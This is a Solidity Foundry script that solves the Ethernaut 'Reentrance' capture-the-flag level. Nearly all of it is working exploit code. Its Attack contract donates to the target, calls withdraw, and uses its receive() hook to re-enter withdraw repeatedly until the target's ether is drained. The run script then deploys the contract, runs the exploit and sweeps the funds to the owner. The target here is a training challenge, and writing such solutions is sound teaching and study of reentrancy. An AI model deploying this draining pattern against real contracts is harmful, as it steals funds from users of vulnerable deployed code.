// SPDX-License-Identifier: MIT
pragma solidity 0.8.21;

import {Script, console2} from "forge-std/Script.sol";
import {EthernautHelper} from "../setup/EthernautHelper.sol";

// NOTE You can import your helper contracts & create interfaces here
interface IReentrance {
    function donate(address _to) external payable;
    function balanceOf(address _who) external returns(uint256);
    function withdraw(uint _amount) external;
}

contract Attack {
    address immutable owner;
    address immutable instance;
    uint256 balance;
    constructor(address addr) payable {
        owner = msg.sender;
        instance = addr;
    }

    function exploit() external {
        IReentrance(instance).donate{value: address(this).balance}(address(this));
        balance = IReentrance(instance).balanceOf(address(this));
        IReentrance(instance).withdraw(balance);
    }

    function withdraw() external {
        (bool success, ) = owner.call{value: address(this).balance}("");
        require(success, "Transfer Failed");
    }

    receive() external payable {
        if(instance.balance>0) {
            IReentrance(instance).withdraw(balance);
        }
    }
}

contract ReentranceSolution is Script, EthernautHelper {
    address constant LEVEL_ADDRESS = 0x2a24869323C0B13Dff24E196Ba072dC790D52479;
    uint256 heroPrivateKey = vm.envUint("PRIVATE_KEY");

    function run() public {
        vm.startBroadcast(heroPrivateKey);
        // NOTE this is the address of your challenge contract
        address challengeInstance = createInstance(LEVEL_ADDRESS);

        Attack attack = new Attack{value: 0.001 ether}(challengeInstance);
        attack.exploit();
        attack.withdraw();

        // SUBMIT CHALLENGE. (DON'T EDIT)
        bool levelSuccess = submitInstance(challengeInstance);
        require(levelSuccess, "Challenge not passed yet");
        vm.stopBroadcast();

        console2.log(successMessage(10));
    }
}
